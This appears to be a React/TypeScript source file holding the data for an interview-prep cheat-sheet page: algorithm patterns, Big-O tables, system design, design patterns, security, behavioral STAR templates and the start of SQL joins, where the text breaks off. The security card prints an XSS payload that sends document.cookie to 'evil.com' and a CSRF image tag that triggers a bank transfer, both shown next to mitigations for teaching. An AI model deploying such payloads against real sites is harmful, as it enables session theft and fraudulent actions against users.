import { useState } from 'react';
import { AppShell } from '../components/AppShell';
import { Icon } from '../components/Icon';
import { useUser } from '../contexts/UserContext';

// ─── Types ────────────────────────────────────────────────────────────────────

interface Card {
  id: string;
  title: string;
  tags: string[];
  complexity?: { time: string; space: string };
  content: string;
  code?: string;
  tip?: string;
}

interface Sheet {
  id: string;
  title: string;
  icon: string;
  color: string;
  bg: string;
  desc: string;
  cards: Card[];
}

// ─── Data ─────────────────────────────────────────────────────────────────────

const SHEETS: Sheet[] = [
  {
    id: 'patterns',
    title: 'Algorithm Patterns',
    icon: 'pattern',
    color: 'text-blue-400',
    bg: 'bg-blue-500/10',
    desc: '14 must-know patterns for cracking any DSA interview',
    cards: [
      {
        id: 'two-pointer',
        title: 'Two Pointers',
        tags: ['Arrays', 'Strings', 'O(n)'],
        complexity: { time: 'O(n)', space: 'O(1)' },
        content: 'Use when searching pairs in a sorted array or checking if a string is a palindrome. One pointer starts at the beginning, another at the end — they converge.',
        code: `// Pair with target sum (sorted array)
function pairSum(arr: number[], target: number) {
  let left = 0, right = arr.length - 1;
  while (left < right) {
    const sum = arr[left]! + arr[right]!;
    if (sum === target) return [left, right];
    sum < target ? left++ : right--;
  }
  return [];
}`,
        tip: 'Trigger: "sorted array", "pair", "palindrome", "in-place"',
      },
      {
        id: 'sliding-window',
        title: 'Sliding Window',
        tags: ['Arrays', 'Strings', 'Subarrays'],
        complexity: { time: 'O(n)', space: 'O(1) or O(k)' },
        content: 'Maintains a window of elements. Expand right to grow, shrink left when constraint violated. Use for max/min subarray or substring problems.',
        code: `// Longest substring with K distinct chars
function longestK(s: string, k: number): number {
  const freq = new Map<string, number>();
  let left = 0, max = 0;
  for (let right = 0; right < s.length; right++) {
    freq.set(s[right]!, (freq.get(s[right]!) ?? 0) + 1);
    while (freq.size > k) {
      const c = s[left++]!;
      const count = freq.get(c)! - 1;
      count === 0 ? freq.delete(c) : freq.set(c, count);
    }
    max = Math.max(max, right - left + 1);
  }
  return max;
}`,
        tip: 'Trigger: "subarray/substring", "at most K", "contiguous"',
      },
      {
        id: 'fast-slow',
        title: 'Fast & Slow Pointers',
        tags: ['Linked List', 'Cycle Detection'],
        complexity: { time: 'O(n)', space: 'O(1)' },
        content: `Floyd's cycle detection. Slow moves 1 step, fast moves 2. If they meet, there's a cycle. Slow pointer at head + meeting point both at cycle start.`,
        code: `// Detect cycle in linked list
function hasCycle(head: ListNode | null): boolean {
  let slow = head, fast = head;
  while (fast && fast.next) {
    slow = slow!.next;
    fast = fast.next.next;
    if (slow === fast) return true;
  }
  return false;
}`,
        tip: 'Trigger: "cycle", "find middle", "kth from end"',
      },
      {
        id: 'merge-intervals',
        title: 'Merge Intervals',
        tags: ['Sorting', 'Greedy'],
        complexity: { time: 'O(n log n)', space: 'O(n)' },
        content: 'Sort by start time. Compare each interval with the last merged one. If overlapping (start ≤ last end), extend the end.',
        code: `function merge(intervals: number[][]): number[][] {
  intervals.sort((a, b) => a[0]! - b[0]!);
  const result: number[][] = [intervals[0]!];
  for (let i = 1; i < intervals.length; i++) {
    const last = result.at(-1)!;
    if (intervals[i]![0]! <= last[1]!) {
      last[1] = Math.max(last[1]!, intervals[i]![1]!);
    } else {
      result.push(intervals[i]!);
    }
  }
  return result;
}`,
        tip: 'Trigger: "overlapping intervals", "scheduling", "meeting rooms"',
      },
      {
        id: 'bfs',
        title: 'BFS (Breadth-First Search)',
        tags: ['Trees', 'Graphs', 'Shortest Path'],
        complexity: { time: 'O(V + E)', space: 'O(V)' },
        content: 'Level-by-level traversal using a queue. Use for shortest path in unweighted graph, level-order traversal, and finding nearest neighbors.',
        code: `function bfs(graph: Map<number, number[]>, start: number) {
  const visited = new Set([start]);
  const queue = [start];
  const order: number[] = [];
  while (queue.length) {
    const node = queue.shift()!;
    order.push(node);
    for (const neighbor of graph.get(node) ?? []) {
      if (!visited.has(neighbor)) {
        visited.add(neighbor);
        queue.push(neighbor);
      }
    }
  }
  return order;
}`,
        tip: 'Trigger: "shortest path", "level order", "nearest"',
      },
      {
        id: 'dfs',
        title: 'DFS (Depth-First Search)',
        tags: ['Trees', 'Graphs', 'Backtracking'],
        complexity: { time: 'O(V + E)', space: 'O(V)' },
        content: 'Explores as deep as possible before backtracking. Use for cycle detection, topological sort, connected components, and island counting.',
        code: `function dfs(graph: Map<number, number[]>, node: number, visited = new Set<number>()): void {
  visited.add(node);
  for (const neighbor of graph.get(node) ?? []) {
    if (!visited.has(neighbor)) dfs(graph, neighbor, visited);
  }
}

// Count islands (grid DFS)
function numIslands(grid: string[][]): number {
  let count = 0;
  for (let r = 0; r < grid.length; r++)
    for (let c = 0; c < grid[0]!.length; c++)
      if (grid[r]![c] === '1') { count++; sink(grid, r, c); }
  return count;
}
function sink(g: string[][], r: number, c: number) {
  if (r < 0 || c < 0 || r >= g.length || c >= g[0]!.length || g[r]![c] !== '1') return;
  g[r]![c] = '0';
  [[-1,0],[1,0],[0,-1],[0,1]].forEach(([dr, dc]) => sink(g, r+dr!, c+dc!));
}`,
        tip: 'Trigger: "number of islands", "connected components", "path exists"',
      },
      {
        id: 'dp-1d',
        title: 'Dynamic Programming (1D)',
        tags: ['DP', 'Optimization'],
        complexity: { time: 'O(n)', space: 'O(n) or O(1)' },
        content: 'Build solution bottom-up from base cases. Each dp[i] represents the optimal answer for subproblem of size i. Coin Change, House Robber, Climbing Stairs.',
        code: `// House Robber — max loot without adjacent houses
function rob(nums: number[]): number {
  if (nums.length === 1) return nums[0]!;
  let prev2 = 0, prev1 = 0;
  for (const n of nums) {
    const curr = Math.max(prev1, prev2 + n);
    prev2 = prev1;
    prev1 = curr;
  }
  return prev1;
}

// Coin Change — min coins to make amount
function coinChange(coins: number[], amount: number): number {
  const dp = Array(amount + 1).fill(Infinity);
  dp[0] = 0;
  for (let i = 1; i <= amount; i++)
    for (const c of coins)
      if (c <= i) dp[i] = Math.min(dp[i]!, dp[i - c]! + 1);
  return dp[amount] === Infinity ? -1 : dp[amount]!;
}`,
        tip: 'Trigger: "min/max", "count ways", "can you reach", "overlapping subproblems"',
      },
      {
        id: 'binary-search',
        title: 'Binary Search',
        tags: ['Sorted Arrays', 'O(log n)'],
        complexity: { time: 'O(log n)', space: 'O(1)' },
        content: 'Works on sorted data. Eliminate half the search space each iteration. Use templates carefully: lo < hi vs lo ≤ hi affects termination.',
        code: `// Classic binary search
function search(nums: number[], target: number): number {
  let lo = 0, hi = nums.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (nums[mid] === target) return mid;
    nums[mid]! < target ? (lo = mid + 1) : (hi = mid - 1);
  }
  return -1;
}

// Search in rotated sorted array
function searchRotated(nums: number[], target: number): number {
  let lo = 0, hi = nums.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (nums[mid] === target) return mid;
    if (nums[lo]! <= nums[mid]!) {
      (target >= nums[lo]! && target < nums[mid]!) ? (hi = mid - 1) : (lo = mid + 1);
    } else {
      (target > nums[mid]! && target <= nums[hi]!) ? (lo = mid + 1) : (hi = mid - 1);
    }
  }
  return -1;
}`,
        tip: 'Trigger: "sorted", "find position", "minimum in rotated", "kth smallest"',
      },
      {
        id: 'heap',
        title: 'Heap / Priority Queue',
        tags: ['Top K', 'Greedy', 'Median'],
        complexity: { time: 'O(n log k)', space: 'O(k)' },
        content: 'Min-heap gives smallest element in O(1). Use for "Top K", K closest points, merge K sorted lists, sliding window median.',
        code: `// Top K frequent elements
function topKFrequent(nums: number[], k: number): number[] {
  const freq = new Map<number, number>();
  for (const n of nums) freq.set(n, (freq.get(n) ?? 0) + 1);

  // Bucket sort by frequency — O(n)
  const buckets: number[][] = Array(nums.length + 1).fill(null).map(() => []);
  for (const [num, count] of freq) buckets[count]!.push(num);

  const result: number[] = [];
  for (let i = buckets.length - 1; i >= 0 && result.length < k; i--)
    result.push(...buckets[i]!);
  return result.slice(0, k);
}`,
        tip: 'Trigger: "top K", "K largest/smallest", "median", "merge K sorted"',
      },
      {
        id: 'backtracking',
        title: 'Backtracking',
        tags: ['Recursion', 'Permutations', 'Combinations'],
        complexity: { time: 'O(2^n) or O(n!)', space: 'O(n)' },
        content: 'Explore all possibilities recursively. At each step: choose, explore, unchoose. Prune branches early when constraint is violated.',
        code: `// All subsets (power set)
function subsets(nums: number[]): number[][] {
  const result: number[][] = [];
  function bt(start: number, curr: number[]) {
    result.push([...curr]);
    for (let i = start; i < nums.length; i++) {
      curr.push(nums[i]!);
      bt(i + 1, curr);
      curr.pop();
    }
  }
  bt(0, []);
  return result;
}

// N-Queens (constraint pruning)
function solveNQueens(n: number): string[][] {
  const result: string[][] = [];
  const cols = new Set<number>(), d1 = new Set<number>(), d2 = new Set<number>();
  function bt(row: number, board: number[]) {
    if (row === n) {
      result.push(board.map((c) => '.'.repeat(c) + 'Q' + '.'.repeat(n - c - 1)));
      return;
    }
    for (let c = 0; c < n; c++) {
      if (cols.has(c) || d1.has(row - c) || d2.has(row + c)) continue;
      cols.add(c); d1.add(row - c); d2.add(row + c);
      bt(row + 1, [...board, c]);
      cols.delete(c); d1.delete(row - c); d2.delete(row + c);
    }
  }
  bt(0, []);
  return result;
}`,
        tip: 'Trigger: "all combinations", "permutations", "N-Queens", "generate all"',
      },
    ],
  },
  {
    id: 'complexity',
    title: 'Big-O Cheat Sheet',
    icon: 'speed',
    color: 'text-green-400',
    bg: 'bg-green-500/10',
    desc: 'Time and space complexity of common data structures and algorithms',
    cards: [
      {
        id: 'ds-complexity',
        title: 'Data Structure Operations',
        tags: ['Reference'],
        content: 'Time complexity of the most common data structure operations:',
        code: `// Arrays
Access:  O(1)   Search: O(n)   Insert: O(n)   Delete: O(n)

// Hash Map
Access:  O(1)   Search: O(1)   Insert: O(1)   Delete: O(1)
Worst case: O(n) due to collisions

// Linked List
Access:  O(n)   Search: O(n)   Insert: O(1)   Delete: O(1)

// Binary Search Tree (balanced)
Access:  O(log n)  Search: O(log n)  Insert: O(log n)  Delete: O(log n)

// Heap (Min/Max)
Peek:    O(1)   Insert: O(log n)   Extract: O(log n)   Build: O(n)

// Stack / Queue
Push/Enqueue: O(1)   Pop/Dequeue: O(1)   Peek: O(1)`,
        tip: 'For interviews: always state the expected case. Mention worst-case when it differs.',
      },
      {
        id: 'sorting-complexity',
        title: 'Sorting Algorithms',
        tags: ['Sorting', 'Comparison'],
        content: 'Know time/space complexity and stability of each sort:',
        code: `// Comparison-based sorts
QuickSort:     avg O(n log n)  worst O(n²)  space O(log n)  NOT stable
MergeSort:     O(n log n)      always        space O(n)      STABLE
HeapSort:      O(n log n)      always        space O(1)      NOT stable
TimSort:       O(n log n)      O(n) best     space O(n)      STABLE ← Python/Java default

// Linear sorts (beat comparison lower bound O(n log n))
CountingSort:  O(n + k)  space O(k)   — works when range is known
RadixSort:     O(nk)     space O(n+k) — digit by digit
BucketSort:    O(n)      avg           — uniform distribution

// Simple but slow
BubbleSort:    O(n²)     O(n) best    space O(1)      STABLE
InsertionSort: O(n²)     O(n) best    space O(1)      STABLE ← best for small/nearly-sorted`,
        tip: 'Interviewers love when you mention: "JS .sort() uses TimSort which is O(n log n) and stable"',
      },
      {
        id: 'graph-complexity',
        title: 'Graph Algorithms',
        tags: ['Graphs', 'Shortest Path'],
        content: 'Time complexities for the most common graph algorithms:',
        code: `// V = vertices, E = edges

BFS:            O(V + E)    space O(V)  — unweighted shortest path
DFS:            O(V + E)    space O(V)  — cycle detection, topological sort
Dijkstra:       O((V+E) log V)  with min-heap  — weighted shortest path (no negative)
Bellman-Ford:   O(VE)       — negative edges, detect negative cycles
Floyd-Warshall: O(V³)       — all-pairs shortest path
Topological Sort (Kahn's): O(V + E)    — DAG, BFS-based
Union-Find:     O(α(n)) ≈ O(1) amortized  — with path compression + rank`,
        tip: 'Dijkstra fails with negative edges — use Bellman-Ford instead',
      },
      {
        id: 'dp-complexity',
        title: 'DP Problem Templates',
        tags: ['DP', 'Common Patterns'],
        content: 'Common DP patterns with their complexities:',
        code: `// 1D DP: dp[i] depends on dp[i-1] or dp[i-2]
// Examples: Fibonacci, Climbing Stairs, House Robber
// Time: O(n), Space: O(1) with rolling variables

// 2D DP: dp[i][j] — grid or two sequence problems
// Examples: LCS, Edit Distance, Unique Paths, Knapsack 0/1
// Time: O(m×n), Space: O(m×n) or O(n) with row compression

// Interval DP: dp[i][j] — range/palindrome problems
// Examples: Matrix Chain Multiplication, Burst Balloons
// Time: O(n³), Space: O(n²)

// Bitmask DP: dp[mask][i] — subset problems
// Examples: TSP, Optimal Assignment
// Time: O(2^n × n), Space: O(2^n × n)`,
        tip: 'In interviews: start with brute force O(2^n), show memoization O(n) insight to impress.',
      },
    ],
  },
  {
    id: 'system-design',
    title: 'System Design Cards',
    icon: 'architecture',
    color: 'text-purple-400',
    bg: 'bg-purple-500/10',
    desc: 'Key concepts, trade-offs, and interview frameworks',
    cards: [
      {
        id: 'sd-framework',
        title: 'RESHADED Framework',
        tags: ['Interview Framework'],
        content: 'Structured 8-step approach for any system design interview:',
        code: `R — Requirements: Functional (what it does) + Non-functional (latency, scale)
E — Estimation: DAU → QPS → storage → bandwidth
S — Storage: SQL vs NoSQL, schema, indexes, sharding
H — High-level design: Core services, load balancers, caches
A — API design: REST endpoints, request/response schemas
D — Detailed design: Deep dive on 2-3 critical components
E — Evaluate: Bottlenecks, single points of failure, trade-offs
D — Discuss: Monitoring, alerting, disaster recovery, cost

// Example: Design Twitter Feed
// DAU: 100M users | 10% active/day = 10M DAU
// Read QPS: 10M × 10 reads/day / 86400 ≈ 1157 QPS (peak × 3 = 3500 QPS)
// Write QPS: 10M × 1 tweet/day / 86400 ≈ 116 QPS
// Storage: 100 bytes/tweet × 116 QPS × 86400 × 365 ≈ 3.6 TB/year`,
        tip: 'Spend 5 minutes on requirements. Interviewers want to see you clarify, not assume.',
      },
      {
        id: 'cap-theorem',
        title: 'CAP Theorem',
        tags: ['Distributed Systems', 'Trade-offs'],
        content: 'A distributed system can only guarantee 2 of 3: Consistency, Availability, Partition Tolerance. Since network partitions always happen, you choose CP or AP.',
        code: `CP systems (Consistency + Partition Tolerance):
  HBase, Zookeeper, MongoDB (default config)
  → Returns error instead of stale data
  → Use when: banking, transactions, inventory

AP systems (Availability + Partition Tolerance):
  Cassandra, CouchDB, DynamoDB
  → Returns possibly stale data, eventually consistent
  → Use when: social feeds, product catalog, DNS

// Key questions for interviews:
// "Can you tolerate stale reads?" → AP
// "Is strong consistency required?" → CP
// "What are the consistency guarantees?" → Eventual vs Strong vs Causal`,
        tip: 'Most NoSQL databases are AP. Most relational DBs with replication are CP.',
      },
      {
        id: 'caching',
        title: 'Caching Strategies',
        tags: ['Performance', 'Redis'],
        content: 'Caching reduces database load and latency. Choose the right strategy based on read/write patterns.',
        code: `// Cache-Aside (Lazy Loading) — most common
1. Read from cache
2. Miss? Read from DB, write to cache, return
Pros: Only caches requested data, resilient to cache failure
Cons: Cache miss penalty, potential stale data

// Write-Through
1. Write to cache AND DB simultaneously
Pros: No stale data, consistent
Cons: Extra write latency, unused data also cached

// Write-Behind (Write-Back)
1. Write to cache, async write to DB
Pros: Reduced DB load on writes
Cons: Risk of data loss on cache failure

// Eviction Policies:
LRU (Least Recently Used) — most popular
LFU (Least Frequently Used) — hot data stays longer
TTL (Time To Live) — automatic expiry

// Cache-busting on updates:
Option 1: Delete cache key on write → next read refreshes
Option 2: Versioned keys: user:42:v3 → v4 on update`,
        tip: 'State your eviction policy and TTL in interviews — shows you think about staleness.',
      },
      {
        id: 'load-balancing',
        title: 'Load Balancing & Consistent Hashing',
        tags: ['Scalability', 'Distribution'],
        content: 'Distribute requests across servers. Consistent hashing minimizes re-distribution when nodes join/leave.',
        code: `// Load Balancing Algorithms:
Round Robin         → sequential, equal load
Weighted Round Robin → by server capacity
Least Connections   → send to server with fewest active connections
IP Hash             → same client → same server (sticky sessions)
Random              → random server selection

// Consistent Hashing (used by: DynamoDB, Cassandra, Redis Cluster):
- Map servers to a ring of 2^32 positions using hash(server_id)
- Map requests to ring using hash(request_key)
- Find next clockwise server
- Adding/removing a server only remaps O(K/N) keys
  where K = total keys, N = number of nodes

// Virtual Nodes:
- Each server gets multiple ring positions (e.g., 150 vnodes)
- Distributes load more evenly
- Reduces "hot spot" effect when one server is overloaded`,
        tip: 'Consistent hashing is used in: CDN, distributed cache, database sharding.',
      },
      {
        id: 'database-scaling',
        title: 'Database Scaling Patterns',
        tags: ['Databases', 'Sharding', 'Replication'],
        content: 'Scale databases vertically (bigger server) or horizontally (more servers via replication/sharding).',
        code: `// Read Replicas (Master-Slave Replication)
- All writes → primary (master)
- Reads distributed across replicas
- Replication lag: replicas may be slightly behind
- Use for: read-heavy workloads, analytics, reporting

// Sharding (Horizontal Partitioning)
- Split data across multiple DBs by shard key
- Hash sharding: hash(user_id) % num_shards
- Range sharding: user_id 0-1M → shard1, 1M-2M → shard2
- Directory sharding: lookup table maps key → shard

// Sharding challenges:
- Cross-shard joins become expensive or impossible
- Rebalancing when adding shards
- Distributed transactions are hard

// Denormalization:
- Store redundant data to avoid joins
- Trade: write complexity, storage cost for read speed
- Example: store author_name in posts table instead of joining users

// CQRS + Event Sourcing:
- Separate Read model (optimized for queries) and Write model
- Write model stores events, Read model materializes state`,
        tip: 'Always shard by access pattern. A bad shard key causes hot spots.',
      },
    ],
  },
  {
    id: 'oop-patterns',
    title: 'Design Pattern Quick Ref',
    icon: 'account_tree',
    color: 'text-amber-400',
    bg: 'bg-amber-500/10',
    desc: 'When to use each of the 23 GoF design patterns',
    cards: [
      {
        id: 'creational',
        title: 'Creational Patterns',
        tags: ['OOP', 'Creation'],
        content: 'Control object creation. The right pattern depends on WHO decides the type and HOW complex the creation is.',
        code: `Singleton    — 1 instance, global access point
               When: shared resource (DB conn, config, logger)
               Watch: hidden dependencies, makes testing hard

Factory Method — subclass decides which class to instantiate
               When: framework code that shouldn't know concrete types
               Example: UI toolkit, document creator

Abstract Factory — create families of related objects
               When: system must be independent of how products are created
               Example: UI kit (Button, TextField) for Windows vs macOS

Builder       — step-by-step construction of complex objects
               When: many optional params (telescoping constructor problem)
               Example: QueryBuilder, HtmlBuilder

Prototype     — clone existing object
               When: creating object is expensive, need copies with small changes
               Example: game units, document templates`,
        tip: 'Builder is the modern alternative to constructor with 5+ parameters.',
      },
      {
        id: 'structural',
        title: 'Structural Patterns',
        tags: ['OOP', 'Composition'],
        content: 'Compose classes and objects into larger structures while keeping them flexible.',
        code: `Adapter      — convert interface A to interface B
               When: integrating incompatible third-party libraries
               Example: different payment gateway SDKs behind one interface

Bridge       — decouple abstraction from implementation
               When: both abstraction and implementation need to vary independently
               Example: Shape (Circle, Square) × Renderer (SVG, Canvas)

Composite    — tree structure, treat leaf = composite
               When: hierarchical data (file system, org charts, UI trees)
               Example: HTML DOM, file/folder

Decorator    — add behavior without subclassing (composition > inheritance)
               When: need to add optional features at runtime
               Example: coffee + milk + sugar, streams with buffering/compression

Facade       — simplified interface to complex subsystem
               When: library is complex, hide it behind a simple API
               Example: Startup class that initializes framework, DB, cache

Proxy        — control access to another object
               When: lazy loading, access control, caching, logging
               Example: ORM lazy loading, API rate limiting proxy`,
        tip: 'Decorator ≠ inheritance. You wrap objects, not subclass them.',
      },
      {
        id: 'behavioral',
        title: 'Behavioral Patterns',
        tags: ['OOP', 'Communication'],
        content: 'How objects communicate and distribute responsibility.',
        code: `Observer     — one-to-many: notify dependents on state change
               When: event systems, reactive UIs, pub/sub
               Example: React state → component re-render

Strategy     — swap algorithms at runtime
               When: multiple algorithms for same task, selectable at runtime
               Example: sort strategy, payment method, compression

Command      — encapsulate request as object
               When: undo/redo, queuing, logging, transactions
               Example: Ctrl+Z, job scheduler, remote procedure

Iterator     — sequential access without exposing implementation
               When: traversing different collections uniformly
               Example: for...of in JS, database cursor

State        — object behavior changes with its state
               When: finite state machine, object with distinct modes
               Example: traffic light, order lifecycle, UI wizard

Template Method — skeleton in base class, steps in subclasses
               When: algorithm has fixed structure, variable steps
               Example: data import pipeline, test framework setup/teardown

Chain of Responsibility — pass request along chain of handlers
               When: multiple handlers, don't know which handles it
               Example: middleware (Express), event bubbling, CORS headers`,
        tip: 'Observer = push (subject notifies). Iterator = pull (client requests next).',
      },
    ],
  },
  {
    id: 'security',
    title: 'Security Quick Reference',
    icon: 'shield',
    color: 'text-red-400',
    bg: 'bg-red-500/10',
    desc: 'OWASP Top 10, attack vectors, and secure coding rules',
    cards: [
      {
        id: 'owasp',
        title: 'OWASP Top 10 (2021)',
        tags: ['OWASP', 'Web Security'],
        content: 'The most critical security risks in web applications:',
        code: `A01 — Broken Access Control       ← #1, most common
      Mitigation: Deny by default, check every request server-side

A02 — Cryptographic Failures       (was Sensitive Data Exposure)
      Mitigation: TLS everywhere, bcrypt for passwords, no MD5/SHA1

A03 — Injection (SQLi, NoSQLi, OS, LDAP)
      Mitigation: Parameterized queries, ORMs, input validation

A04 — Insecure Design              (new in 2021)
      Mitigation: Threat modeling, security requirements up front

A05 — Security Misconfiguration
      Mitigation: Least privilege, disable defaults, patch regularly

A06 — Vulnerable and Outdated Components
      Mitigation: SCA tools (Snyk, npm audit), update dependencies

A07 — Identification & Authentication Failures
      Mitigation: MFA, rate limiting, secure session management

A08 — Software & Data Integrity Failures (new)
      Mitigation: Verify integrity of updates, CI/CD pipeline security

A09 — Security Logging & Monitoring Failures
      Mitigation: Log auth events, alert on anomalies, retain logs

A10 — Server-Side Request Forgery (SSRF) (new)
      Mitigation: Allowlist internal services, block 169.254.x.x`,
        tip: 'In interviews: IDOR (A01) and SQLi (A03) are the most common real-world vulnerabilities.',
      },
      {
        id: 'auth-security',
        title: 'Authentication & JWT Security',
        tags: ['Auth', 'JWT', 'Sessions'],
        content: 'Secure authentication patterns and common JWT pitfalls:',
        code: `// JWT Structure: header.payload.signature (Base64URL encoded)
// header: { alg: "HS256", typ: "JWT" }
// payload: { sub: "userId", iat: 1234, exp: 1234+3600 }
// signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)

// Common JWT vulnerabilities:
1. alg=none attack — always verify algorithm explicitly
2. Weak secret — use 256-bit random secret, not "secret123"
3. No expiry (exp) — always set short TTL (15min access, 7d refresh)
4. Sensitive data in payload — payload is base64, NOT encrypted

// Secure token storage:
HttpOnly Cookie (CSRF risk, use SameSite=Strict)
Memory (lost on refresh, best XSS protection)
localStorage (XSS risk — avoid for sensitive tokens)

// Refresh token rotation:
- Access token: short-lived (15 min)
- Refresh token: long-lived (7 days), stored HttpOnly
- On refresh: issue new refresh token, invalidate old one`,
        tip: 'Never store tokens in localStorage in production. Prefer HttpOnly + SameSite cookies.',
      },
      {
        id: 'xss-csrf',
        title: 'XSS vs CSRF',
        tags: ['XSS', 'CSRF', 'Web Security'],
        content: 'Two of the most misunderstood client-side attacks:',
        code: `// XSS (Cross-Site Scripting) — attacker runs JS in victim's browser
// Attack: inject <script>fetch('evil.com/steal?c='+document.cookie)</script>
// Types:
//   Stored XSS  — malicious script saved in DB (blog comments)
//   Reflected   — script in URL parameter, reflected in response
//   DOM-based   — script in client-side code (document.write(location.hash))
// Mitigation:
//   1. Escape output: & → &amp; < → &lt; > → &gt;
//   2. Content Security Policy: Content-Security-Policy: script-src 'self'
//   3. HttpOnly cookies (can't be stolen by JS)
//   4. Input sanitization (DOMPurify for rich text)

// CSRF (Cross-Site Request Forgery) — attacker tricks user's browser to make requests
// Attack: <img src="bank.com/transfer?to=attacker&amount=1000">
//   victim's browser sends cookies automatically → authenticated request!
// Mitigation:
//   1. CSRF token (double-submit cookie or synchronizer token)
//   2. SameSite=Strict cookies (modern browsers block cross-site requests)
//   3. Check Origin/Referer headers
//   4. Require re-authentication for sensitive actions`,
        tip: 'XSS = attacker steals victim data. CSRF = attacker uses victim identity. Different!',
      },
    ],
  },
  {
    id: 'behavioral',
    title: 'Behavioral STAR Bank',
    icon: 'psychology',
    color: 'text-green-400',
    bg: 'bg-green-500/10',
    desc: 'STAR-format answer templates for every behavioral category',
    cards: [
      {
        id: 'star-framework',
        title: 'STAR Framework',
        tags: ['Framework', 'Structure'],
        content: 'Every behavioral answer should follow STAR. Spend 20% on S+T, 60% on Action (YOUR actions, not the team), 20% on Result with metrics.',
        code: `S — Situation: Set context in 1-2 sentences
         "At my internship at [Company], we had a production outage
          that was silently dropping 15% of payment transactions."

T — Task: Your responsibility in that situation
         "I was the only backend engineer on call that weekend
          and had to diagnose and fix it within our 4-hour SLA."

A — Action: 3-4 specific actions YOU took (avoid "we")
         "I → added structured logging to the payment service
          I → isolated the bug to a race condition in our retry logic
          I → wrote a targeted fix with a feature flag for safe rollout
          I → wrote a postmortem and proposed a circuit breaker pattern"

R — Result: Quantified outcome + what you learned
         "Restored full functionality in 2h 40min, under SLA.
          0 customer complaints. The circuit breaker was adopted
          org-wide and prevented 3 similar incidents in the next quarter."`,
        tip: 'Rule: Every result must have a number. "Impact" without metrics is just a story.',
      },
      {
        id: 'conflict',
        title: 'Conflict & Disagreement',
        tags: ['Conflict', 'Leadership'],
        content: 'Show that you resolve disagreement through data and empathy, not authority or avoidance. Interviewers want to see that you can hold a position AND collaborate.',
        code: `Template:
"I disagreed with [person/decision] about [topic].
 I gathered [evidence/data] to support my position.
 I scheduled a 1:1 to understand their perspective first.
 We agreed on [outcome] — either I convinced them, they convinced me,
 or we found a third option neither of us had considered."

Strong signals:
✓ Disagreed with manager/senior — and were RIGHT
✓ Changed your mind when shown better data
✓ Escalated appropriately when stuck
✗ "I always defer to my manager"
✗ "I pushed until they agreed"

Example angles:
- Tech choice: REST vs gRPC for internal service
- Scope: pushing back on shipping without tests
- Timeline: saying no to an unrealistic deadline`,
        tip: 'Amazon (LP: Have Backbone) and Meta love this question. Have 2 strong examples ready.',
      },
      {
        id: 'failure',
        title: 'Failure & Mistakes',
        tags: ['Failure', 'Growth'],
        content: 'This is a trust question. Interviewers want to see self-awareness, ownership, and that you extracted a systemic insight, not just a personal one.',
        code: `What NOT to say:
✗ "I work too hard" / "I'm a perfectionist" (non-answers)
✗ Blame the team, requirements, or tooling
✗ A failure with no clear personal responsibility

Strong structure:
1. Own it: "I made the decision to [X]"
2. Consequence: "This caused [specific harm]"
3. Why: "I underestimated [Y] / didn't validate [Z]"
4. Fix: "Immediately, I [A]. Long term, I proposed [B]"
5. Systemic learning: "We now [process change] so this can't recur"

Example: Shipped a migration without a rollback plan
  → caused 40 min of elevated error rate
  → added mandatory rollback criteria to our deployment checklist
  → now a team-wide standard, not just my behavior`,
        tip: 'The best failure stories involve a real impact AND a process that changed because of you.',
      },
      {
        id: 'impact',
        title: 'Most Impactful Contribution',
        tags: ['Impact', 'Metrics'],
        content: 'The impact question. Your answer should make the interviewer think "this person ships real things." Anchor everything in business value.',
        code: `Levels of impact (weakest → strongest):
1. "I built the feature" — code complete, nothing else
2. "I shipped the feature" — in prod, users using it
3. "The feature had X% adoption in first 30 days"
4. "The feature saved $Y/month / improved retention by Z%"
5. "The feature changed the team's approach to [problem]"

Metrics that interviewers love:
- Latency: "p99 dropped from 800ms to 180ms"
- Cost: "Reduced infra spend by $12K/month"
- Scale: "Now handles 10x the previous peak load"
- Users: "5,000 MAU in first month"
- Time: "Saved 3 hours/week per engineer"

Template:
"The highest-impact thing I shipped was [X].
 The problem: [business context + why it mattered].
 My approach: [key technical/design decisions].
 Result: [metric 1, metric 2, what changed].
 Why it was hard: [constraint or insight that made it non-trivial]."`,
        tip: 'Prepare 3 impact stories at different scales: small (days), medium (weeks), large (months).',
      },
      {
        id: 'leadership',
        title: 'Leadership Without Authority',
        tags: ['Leadership', 'Influence'],
        content: 'Especially critical for senior roles. Shows you can drive outcomes beyond your org chart.',
        code: `Common scenarios:
- Convinced a team to adopt a new practice (TDD, code review standards)
- Led a cross-team initiative without being the manager
- Mentored a peer or junior who then independently owned something
- Drove a technical RFC that got adopted

Structure:
"I identified [problem/opportunity] that affected [team/users].
 I didn't have authority to mandate change, so I:
 1. Built a prototype/proof-of-concept to show feasibility
 2. Found internal champions in other teams
 3. Ran a pilot with one team, measured results
 4. Presented results at [all-hands/RFC review]
 Result: [what was adopted, at what scale]"

Signals of strong leadership:
✓ People followed you voluntarily
✓ Impact persisted after you left the project
✓ You accelerated others, not just yourself
✓ You influenced up (manager/director level)`,
        tip: 'Senior eng interviews at Google/Meta care more about this than coding performance.',
      },
      {
        id: 'prioritization',
        title: 'Prioritization Under Pressure',
        tags: ['Prioritization', 'Time Management'],
        content: 'Shows product thinking and stakeholder management. They want to see you make principled trade-offs, not just work harder.',
        code: `Frameworks to name-drop:
ICE Score: Impact × Confidence / Effort (0-10 scale each)
RICE:       Reach × Impact × Confidence / Effort
MoSCoW:     Must have / Should have / Could have / Won't have
Value/Effort matrix: 2×2 quick triage

Template:
"I had [N] competing priorities with [context].
 I evaluated them by [framework/criteria]:
 - [Task A]: blocked [N users], fix = 2h → Priority 1
 - [Task B]: nice-to-have, deadline flexible → Priority 3
 I communicated the trade-offs to [stakeholder] who agreed.
 I [what you shipped] in [timeframe].
 Result: [key outcome without dropping the ball]."

What to avoid:
✗ "I just worked 60 hours to get it all done"
✗ No communication with stakeholders about what's slipping
✗ Saying everything was equally urgent`,
        tip: 'Amazon LP "Deliver Results" + "Are Right A Lot" both show up in this question.',
      },
    ],
  },
  {
    id: 'sql',
    title: 'SQL Patterns',
    icon: 'storage',
    color: 'text-violet-400',
    bg: 'bg-violet-500/10',
    desc: 'Query patterns for joins, window functions, and common interview problems',
    cards: [
      {
        id: 'joins',
        title: 'JOIN Types',
        tags: ['SQL', 'Joins'],
        content: 'Know when each join type produces which rows. The most common interview mistake: confusing INNER JOIN, LEFT JOIN, and their NULLs.',
        code: `-- INNER JOIN: only matching rows from both tables
SELECT u.name, o.amount
